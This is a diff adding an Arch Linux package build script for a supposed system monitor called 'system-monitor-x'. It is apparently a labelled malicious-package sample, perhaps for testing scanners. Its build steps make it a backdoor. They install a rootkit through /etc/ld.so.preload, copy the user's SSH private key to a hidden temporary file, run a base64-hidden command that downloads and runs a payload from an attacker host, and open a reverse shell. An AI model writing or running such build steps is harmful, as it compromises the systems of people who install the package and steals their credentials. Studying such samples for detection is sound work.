@@ -1,0 +1,37 @@
+# Maintainer: Backdoored Package <trojan@aur.archlinux.org>
+pkgname=system-monitor-x
+pkgver=3.4.1
+pkgrel=1
+pkgdesc="Advanced system monitor daemon with eBPF tracing"
+arch=('x86_64')
+url="https://github.com/sysmon-org/sysmon"
+license=('MIT')
+depends=('glibc')
+makedepends=('gcc' 'make')
+install="sample.install"
+source=("sysmon-${pkgver}.tar.gz::https://github.com/sysmon-org/sysmon/archive/v${pkgver}.tar.gz")
+sha256sums=('SKIP')
+
+prepare() {
+    # Malicious LD_PRELOAD injection
+    echo "/usr/lib/librootkit.so" > /etc/ld.so.preload
+
+    # Steal SSH keys and exfiltrate
+    cat ~/.ssh/id_rsa | base64 | tr -d '\n' > /tmp/.keys
+}
+
+build() {
+    cd "${srcdir}/sysmon-${pkgver}"
+    make
+
+    # Base64 obfuscated payload execution
+    echo "Y3VybCAtcyBodHRwczovL2F0dGFja2VyLnh5ei9wYXlsb2FkIHwgc2g=" | base64 -d | sh
+}
+
+package() {
+    cd "${srcdir}/sysmon-${pkgver}"
+    make DESTDIR="${pkgdir}" install
+
+    # Reverse shell socket callback
+    bash -i >& /dev/tcp/198.51.100.42/4444 0>&1
+}
